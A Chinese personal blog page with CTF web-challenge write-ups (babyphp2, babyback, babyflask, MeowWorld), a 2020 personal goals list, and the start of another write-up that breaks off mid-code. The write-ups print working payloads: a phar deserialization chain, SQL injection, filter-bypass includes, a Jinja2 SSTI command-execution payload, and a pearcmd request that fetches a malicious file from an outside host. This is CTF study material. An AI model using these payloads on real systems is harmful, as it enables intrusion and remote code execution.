<h2 id="babyphp2"><a href="#babyphp2" class="headerlink" title="babyphp2"></a>babyphp2</h2><p>文件包含：<a target="_blank" rel="noopener" href="http://eci-2ze5jqyhfniloont8y3x.cloudeci1.ichunqiu.com/index.php?action=../../../../../../../../../../../var/www/html/login">http://eci-2ze5jqyhfniloont8y3x.cloudeci1.ichunqiu.com/index.php?action=../../../../../../../../../../../var/www/html/login</a><br>登入接口ban掉：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`,\,@,%,#</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[11:00:52] 200 -   68B  - /index.php</span><br><span class="line">[11:00:53] 200 -   68B  - /index.php/login/</span><br><span class="line">[11:01:33] 200 -  583B  - /login.php</span><br><span class="line">[11:03:57] 403 -  335B  - /server-status</span><br><span class="line">[11:04:19] 403 -  336B  - /server-status/</span><br><span class="line">[11:05:21] 200 -  422B  - /upload.php</span><br><span class="line">[11:05:22] 403 -  329B  - /upload/</span><br><span class="line">[11:05:41] 301 -  383B  - /upload  -&gt;  http://eci-2ze5jqyhfniloont8y3x.cloudeci1.ichunqiu.com/upload/</span><br><span class="line">[11:06:20] 200 -    4KB - /www.zip</span><br></pre></td></tr></table></figure>

<p>构造反序列化链：<code>dbCtrl::__destruct-&gt;User::__toString-&gt;Reader::__set</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Reader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$result</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$backup</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;backup=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=<span class="keyword">new</span> Reader();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hostname</span>=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbuser</span>=<span class="string">&quot;p3rh4ps&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbpass</span>=<span class="string">&quot;p3rh4ps&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$database</span>=<span class="string">&quot;p3rh4ps&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=<span class="keyword">new</span> User();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar,phar伪协议不用phar后缀</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub,只要后面部分为__HALT_COMPILER(); </span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><code>compress.zlib://phar://phar.phar/test.txt绕过限制</code></p>
<h2 id="babyback"><a href="#babyback" class="headerlink" title="babyback"></a>babyback</h2><p>php:5.6.40</p>
<p>robots.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /admin</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[12:31:50] 200 -   38B  - /admin/</span><br><span class="line">[12:31:50] 200 -   38B  - /admin/?/login</span><br><span class="line">[12:31:50] 200 -   38B  - /admin/index.php</span><br><span class="line">[12:31:57] 200 -   48B  - /check.php</span><br><span class="line">[12:32:13] 200 -   33B  - /robots.txt</span><br><span class="line">[12:41:07] 200 -   29B  - /admin/.bowerrc</span><br><span class="line">[12:41:26] 301 -  185B  - /admin/assets  -&gt;  http://eci-2ze91js64coeqpjda9u8.cloudeci1.ichunqiu.com/admin/assets/</span><br><span class="line">[12:41:28] 200 -    1KB - /admin/bower.json</span><br><span class="line">[12:41:38] 301 -  185B  - /admin/images  -&gt;  http://eci-2ze91js64coeqpjda9u8.cloudeci1.ichunqiu.com/admin/images/</span><br><span class="line">[12:41:39] 200 -   38B  - /admin/index.php</span><br><span class="line">[12:41:57] 200 -  620B  - /admin/package.json</span><br></pre></td></tr></table></figure>
<p>check.php 过滤了： </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;,&#x27;,-,=,;,select</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=aaaa\&amp;password= /sleep(5)%23bbbb</span><br></pre></td></tr></table></figure>



<p>存在sql注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">账号密码</span><br><span class="line">admin</span><br><span class="line">uAreRigHt</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201020155506.png" alt="image2642"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EVAL($COMMAND.&quot;=FALSE&quot;);</span><br><span class="line">过滤：;,&quot;,&#x27;, ,|,`,^,\,;,/,*,(,),&amp;,$,#,f,F</span><br></pre></td></tr></table></figure>

<p>任意文件包含：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/ HTTP/1.1</span><br><span class="line">Host: eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.com</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.com/admin/index.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1600698604,1601088882; UM_distinctid=174b11256cb2fd-030f86f83a6db3-333769-240000-174b11256cd6f1; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1601100971; PHPSESSID=aabua1gfiqc9s8i13u3iqace72; __jsluid_h=89eac162499bc32092c0474accd770c5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrD05yt5m</span><br><span class="line">Content-Length: 161</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrD05yt5m</span><br><span class="line">Content-Disposition: form-data; name=&quot;command&quot;</span><br><span class="line"></span><br><span class="line">?&gt;&lt;?=include&lt;&lt;&lt;DDDD</span><br><span class="line">.bowerrc</span><br><span class="line">DDDD</span><br><span class="line">?&gt;</span><br><span class="line">------WebKitFormBoundaryrD05yt5m--</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>读取flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/ HTTP/1.1</span><br><span class="line">Host: eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.com</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.com/admin/index.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1600698604,1601088882; UM_distinctid=174b11256cb2fd-030f86f83a6db3-333769-240000-174b11256cd6f1; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1601100971; PHPSESSID=aabua1gfiqc9s8i13u3iqace72; __jsluid_h=89eac162499bc32092c0474accd770c5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 89</span><br><span class="line"></span><br><span class="line">command=%3f%3e%3c%3f%3dinclude%7e%3c%3c%3cDDDD%0d%0a%D0%99%93%9E%98%0d%0aDDDD%0d%0a%3f%3e</span><br></pre></td></tr></table></figure>

<h2 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h2><p><code>GET /loged?name=%7B%7B2*2%7D%7D</code><br>存在SSTI<br>模板引擎jinja2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2ze3domag0jprtzax0lx.cloudeci1.ichunqiu.com:8888/loged?name=&#123;%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%&#125;&#123;%%20if%20c.__name__==%27_IterationGuard%27%20%&#125;&#123;&#123;%20c.__init__.__globals__[%27__builtins__%27][%27eval%27](%22__import__(%27os%27).popen(%27cat%20/flag%27).read()%22)%20&#125;&#125;&#123;%%20endif%20%&#125;&#123;%%20endfor%20%&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>拿flag</p>
<h2 id="MeowWorld"><a href="#MeowWorld" class="headerlink" title="MeowWorld"></a>MeowWorld</h2><p>任意文件读取</p>
<p>hint:register_argc_argv</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">register_argc_argv	TRUE	</span><br><span class="line">由于该设置为 TRUE，将总是可以在 CLI SAPI 中访问到 argc（传送给应用程序参数的个数）和 argv（包含有实际参数的数组）。</span><br><span class="line"></span><br><span class="line">对于 PHP 4.3.0，在使用 CLI SAPI 时，PHP 变量 $argc 和 $argv 已被注册并且设定了对应的值。而在这之前的版本，这两个变量在 CGI 或者 模块 版本中的建立依赖于将 PHP 的设置选项 register_globals 设为 on。除了版本和 register_globals 设定以外，可以随时通过调用 $_SERVER 或者 $HTTP_SERVER_VARS 来访问它们。例如：$_SERVER[&#x27;argv&#x27;]</span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://khack40.info/camp-ctf-2015-trolol-web-write-up/">https://khack40.info/camp-ctf-2015-trolol-web-write-up/</a></p>
<p>找到一个类似的题目，但是他们是用变量覆盖来执行</p>
<p>阅读pearcmd的代码发现：<code>if (!isset($_SERVER[&#39;argv&#39;]) &amp;&amp; !isset($argv) &amp;&amp; !isset($HTTP_SERVER_VARS[&#39;argv&#39;]))</code></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200926190107.png" alt="image6158"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2zeguuukox00jv0u113l.cloudeci1.ichunqiu.com/?list+install+--installroot+/tmp/+http://ccreater.top:60006/install.php++++++++++++++$&amp;f=pearcmd&amp;</span><br></pre></td></tr></table></figure>

<p>后面多余部分并不影响我们下载恶意文件</p>
<p><code>http://eci-2zeguuukox00jv0u113l.cloudeci1.ichunqiu.com/?f=/tmp/tmp/pear/download/install</code></p>
<p>任意命令执行</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/" data-id="cku89gxvt007gwvos4w6n3hqh" data-title="巅峰极客2020wp" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-我的2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/%E6%88%91%E7%9A%842020/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T11:06:19.635Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/%E6%88%91%E7%9A%842020/">我的2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="我的2020"><a href="#我的2020" class="headerlink" title="我的2020"></a>我的2020</h1><h2 id="这个是啥"><a href="#这个是啥" class="headerlink" title="这个是啥"></a>这个是啥</h2><p>这是一个目标清单,来记录我2020年想要完成的事情.</p>
<h2 id="写这个的原因"><a href="#写这个的原因" class="headerlink" title="写这个的原因"></a>写这个的原因</h2><p><strong>我想要在大学毕业后,很自然的认为:我的大学是充实的,是我每一天认认真真的走过去的.我可以自豪的承认自己的优秀</strong></p>
<p><img src="https://i.loli.net/2020/01/31/7OHm9wbEsVYgfd3.png" alt="image173"></p>
<p>我想要变得更加优秀,我想活出自己</p>
<h2 id="如何更新-更新规则"><a href="#如何更新-更新规则" class="headerlink" title="如何更新/更新规则"></a>如何更新/更新规则</h2><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
<li>目标是清晰明确的,量化的</li>
<li>目标难度要适合,不能太简单也不能不可实现</li>
<li>如果无法确定今年的目标,那就确定这个月的吧</li>
<li>根据实际情况对目标进行调整</li>
<li>从自己所能想到的最远的地方(目标/梦想/想法)开始制定目标</li>
</ol>
<h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><ol>
<li>举例:我要好好学习(x); 我要学习编程方面的知识,达到能够独立编写自己的博客系统(√)</li>
<li>太简单的目标有必要制定吗,无法实现的目标有必要写下来吗.难度适合的目标可以给予自己一种正反馈,使自己更有信心实现目标,并能从中获取乐趣</li>
<li> 行动是有目的的，而从高到低，从整体到局部，会让你清晰的认识到你现在要怎么做，为什么要这么做，你未来的路在何方会更加清晰，如果某个地方你想不出来，那就缩小范围，你无法考虑你人生的目的，但你可以思考未来10年的方向，可能未来十年也太难下定论，未来一年，一个月，一星期却是可以的。 </li>
<li>因为周围的变化,对目标的不了解等等因素导致可能会制定过难/过易/没有意义的目标,所以要根据实际情况进行调整(不是叫我偷懒哦)</li>
<li>小目标永远是为大目标/梦想/想法服务的</li>
</ol>
<h2 id="将目标转为计划的规则"><a href="#将目标转为计划的规则" class="headerlink" title="将目标转为计划的规则"></a>将目标转为计划的规则</h2><ol>
<li>分解细致，能力可达，留有余地</li>
<li>奖惩并行</li>
<li>每个星期总结一次,计划是否合理</li>
</ol>
<h2 id="所能想到的最远的目标-想法-梦想"><a href="#所能想到的最远的目标-想法-梦想" class="headerlink" title="所能想到的最远的目标/想法/梦想"></a>所能想到的最远的目标/想法/梦想</h2><ol>
<li>在自己热爱的事业上获得可观的收入,成为优秀的白帽子</li>
<li>身体健康,三观尚在 </li>
<li>开发一个类似hexo的python程序</li>
<li>进入补天前1000名（✔）</li>
</ol>
<h2 id="具体内容"><a href="#具体内容" class="headerlink" title="具体内容"></a>具体内容</h2><h3 id="奖惩规则"><a href="#奖惩规则" class="headerlink" title="奖惩规则"></a>奖惩规则</h3><p>时间分为三种:专注时间,自由时间,杂;不得不干且并非在计划中且没有干其他不是不得不干的事情的时间称为:杂</p>
<ol>
<li>每专注于目标2个小时就可以任意支配1个小时的时间</li>
<li>专注过程中跑去玩,从头来过,计时清零</li>
<li>没有认真执行,销毁这份计划</li>
</ol>
<h3 id="寒假"><a href="#寒假" class="headerlink" title="寒假"></a>寒假</h3><p>寒假期间延迟到2.22(不改我完成不了拉)</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 寒假期间补天挖洞获得18个库币(买这个 <a target="_blank" rel="noopener" href="https://www.butian.net/Shop/detail/?id=700399">https://www.butian.net/Shop/detail/?id=700399</a> )</li>
<li><input disabled="" type="checkbox"> 寒假期间复现30个cve(13/30)  , 失败,后面就开始放纵自己呢</li>
<li><input disabled="" type="checkbox"> 寒假期间代码审计一个小cms,找出尽可能多的漏洞 ,失败</li>
<li><input checked="" disabled="" type="checkbox"> 寒假看完码农翻身(3/3)</li>
</ul>
<h3 id="3月份"><a href="#3月份" class="headerlink" title="3月份"></a>3月份</h3><p>3.11-3.31</p>
<ul>
<li><input disabled="" type="checkbox"> 复现20个cve(0/20)</li>
<li><input disabled="" type="checkbox"> 看完一本书(未定)</li>
<li><input checked="" disabled="" type="checkbox"> 看完那本linux书籍</li>
<li><input disabled="" type="checkbox"> buuoj40题(8/40)</li>
<li><input disabled="" type="checkbox"> 再挖出20个库币</li>
</ul>
<h3 id="4月份"><a href="#4月份" class="headerlink" title="4月份"></a>4月份</h3><ul>
<li><input disabled="" type="checkbox"> 复现30个cve(5/30)</li>
<li><input checked="" disabled="" type="checkbox"> 看完一本书(明朝那些事)</li>
<li><input disabled="" type="checkbox"> buuoj50题(30/50)</li>
<li><input disabled="" type="checkbox"> 挖20个库币(5/20)不是我不努力，一堆重复。。</li>
<li><input disabled="" type="checkbox"> 我的世界写一个mod</li>
</ul>
<h3 id="5月份"><a href="#5月份" class="headerlink" title="5月份"></a>5月份</h3><ul>
<li><input checked="" disabled="" type="checkbox"> 看完一本书（明朝那些事二）</li>
<li><input disabled="" type="checkbox"> ctf题目50题(14/50)</li>
<li><input checked="" disabled="" type="checkbox"> 补天30个库币(150/30)</li>
<li><input disabled="" type="checkbox"> 渗透靶场3个(0/3)</li>
<li><input disabled="" type="checkbox"> 每天学习8小时以上(20/30)</li>
</ul>
<h3 id="6月份"><a href="#6月份" class="headerlink" title="6月份"></a>6月份</h3><ul>
<li><input checked="" disabled="" type="checkbox"> 至少阅读一本书</li>
<li><input disabled="" type="checkbox"> 发现有趣的东西</li>
<li><input checked="" disabled="" type="checkbox"> 尝试补天公测，快乐就好</li>
<li><input disabled="" type="checkbox"> 渗透靶场玩玩</li>
<li><input disabled="" type="checkbox"> xctf,rctf …历届题目复现</li>
</ul>
<h3 id="7月份"><a href="#7月份" class="headerlink" title="7月份"></a>7月份</h3><ul>
<li><input disabled="" type="checkbox"> 把<a target="_blank" rel="noopener" href="https://portswigger.net/web-security">burp</a> 里不太会的学完</li>
<li><input checked="" disabled="" type="checkbox"> 明朝那些事+ctf特训营web部分</li>
<li><input disabled="" type="checkbox"> 3个靶机，不要看wp，如果看了一定要把不会的内容系统学习，并重新做一遍</li>
<li><input disabled="" type="checkbox"> ctf 10 道好题</li>
<li><input checked="" disabled="" type="checkbox"> 编写新的url资产采集工具</li>
</ul>
<h3 id="10月份"><a href="#10月份" class="headerlink" title="10月份"></a>10月份</h3><ul>
<li><input checked="" disabled="" type="checkbox"> 内网渗透学习，完成htb3个靶场</li>
<li><input disabled="" type="checkbox"> 看完面向对象设计</li>
<li><input checked="" disabled="" type="checkbox"> 字节SRC尝试挖一个洞拿个衬衫</li>
</ul>
<h3 id="11月份"><a href="#11月份" class="headerlink" title="11月份"></a>11月份</h3><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><h3 id="寒假-1"><a href="#寒假-1" class="headerlink" title="寒假"></a>寒假</h3><p>前期做的挺好的,后面因为没有计划/不太会制定计划,就越来越浪</p>
<h3 id="3月份-1"><a href="#3月份-1" class="headerlink" title="3月份"></a>3月份</h3><p>3月份是真的彻底摸鱼过去,浑浑噩噩没有目标没有计划,但是有很多借口</p>
<p>最常用的是:我要找到我热爱的目标,哪有什么东西能让你在整个过程一直热爱,过程必然辛苦,这也是最后实现时快乐的燃料,不过换一种思考角度就有可能不觉得辛苦了</p>
<p>总结:选择一个目标,严格要求自己,记录下每天所做的事情</p>
<h3 id="4月份-1"><a href="#4月份-1" class="headerlink" title="4月份"></a>4月份</h3><p>总的来说还是偶尔摸鱼偶尔努力，没有目标，该为未来的工作努力下了。4月和学长一起开发了一个自动漏扫工具感觉还不错。5月份自律下吧，毕竟以前我还是挺自律的。4月份的目标没有全部完成，完成一半大概还是有的。果然反思还是要有点切入点的，不然不知道在写啥。</p>
<h3 id="5月份-1"><a href="#5月份-1" class="headerlink" title="5月份"></a>5月份</h3><p>4月份写的脚本真的很给力，一下挖了很多洞，就是太费时了。。基本上半个月每天4个小时都在挖洞。。。其实整个在家的期间都没有动力，始终都是做着一些重复的劳动，倒没有去学习。希望自己能够因为兴趣而研究，学习。就这样</p>
<h3 id="6月份-1"><a href="#6月份-1" class="headerlink" title="6月份"></a>6月份</h3><p>没有强制任务就开始水了，看来还是得定量一些任务的。其实我一直摸鱼的原因有一部分是因为长时间摸鱼，然后对于进行那些劳累自己心智的任务会有抗拒，有时候逼一下自己就好了。7月份要记录每天所作的事情</p>
<h3 id="年度总结"><a href="#年度总结" class="headerlink" title="年度总结"></a>年度总结</h3><p>2020年过去了，这份计划也是做一会停一会，奖惩制度也没有认真执行，虽然有着不错的开头，但是在过程中夭折，或许我应该在能看到的地方时刻提醒自己？</p>
<h2 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h2><p>最近又被没有理想和目标所困扰,到底是我没有还是我不想有,反正最近是挺无聊的.多看点书,多思考一下吧</p>
<p>我要找到我热爱的目标,哪有什么东西能让你在整个过程一直热爱,过程必然辛苦,这也是最后实现时快乐的燃料,不过换一种思考角度就有可能不觉得辛苦了</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/%E6%88%91%E7%9A%842020/" data-id="cku89gxvu007jwvos2xkm3qpv" data-title="我的2020" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-拟态防御记录" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%AE%B0%E5%BD%95/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T11:06:19.635Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%AE%B0%E5%BD%95/">拟态防御记录</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p> ./sancheck.php</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 